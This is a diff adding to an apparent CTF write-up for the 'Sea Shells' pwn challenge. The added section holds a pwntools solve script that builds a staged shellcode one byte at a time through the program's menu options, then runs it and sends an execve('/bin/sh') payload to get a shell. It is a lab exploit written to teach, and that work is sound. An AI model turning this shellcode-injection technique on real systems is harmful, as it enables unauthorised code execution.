@@ -904,7 +904,7 @@ The twist is that we can't directly set the value at `steer[idx]` to the byte we
 
 But notice that we can control the index by using option 1 or 2 and that even if we can't directly control the byte at that index we can make use of option 3 to 6 to set it to what we want
 
-Now here's where things began to get though
+Now here's where things began to get tough
 
 Our goal is obvious, fill up `steer` with our shellcode and execute it with option 7
 
@@ -919,7 +919,7 @@ I spent a lot of time trying to write an algorithm that generates all valid numb
 Next i wrote a mathematical representation which represents the way we'd set our byte:
 
 ```
-22a + 100b + 15c + (256 - 9)d = value_we_want % 256
+22a + 100b + 15c + (256 - 9)d = value % 256
 ```
 
 I tried use:
@@ -951,7 +951,67 @@ def create(val):
         return [a, b, c, d]
 ```
 
+Now we can easily write our shellcode byte to the steer array
 
+Doing that works and here's my solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/perfectr00t24/scripts/Sea%20Shells/solve.py)
+![image](https://github.com/user-attachments/assets/84785e07-b4f9-446a-975c-5153220a219c)
+
+```python
+def solve():
+
+    sh = asm("""
+        execve:
+            lea rdi, [rip+sh]
+            xor esi, esi
+            xor edx, edx
+            xor eax, eax
+            mov al, 0x3b
+            syscall
+            
+        sh:
+             .ascii "/bin/sh"
+             .byte 0
+        """)
+
+    sc = asm("""
+            mov rsi, rdx
+            add rsi, 0x50
+            mov rdx, 0x100
+            syscall
+            call rsi
+    """)
+
+    for byte in sc:
+        a, b, c, d = create(byte)
+
+        for _ in range(a):
+            io.recvuntil(b"lines!")
+            io.sendline(b"3")
+
+        for _ in range(b):
+            io.recvuntil(b"lines!")
+            io.sendline(b"4")
+
+        for _ in range(c):
+            io.recvuntil(b"lines!")
+            io.sendline(b"5")
+    
+        for _ in range(d):
+            io.recvuntil(b"lines!")
+            io.sendline(b"6")
+    
+        io.recvuntil(b"lines!")
+        io.sendline(b"2")
+
+    io.sendline(b"7")
+    io.sendline(sh)
+```
+
+It also works remotely but the thing is that it takes time
+
+For me during the time i solved it, it took about 30minutes and one condition causing that is likely network latency, nevertheless i got the flag
+
+####  Arm and a leg 
 
 
 
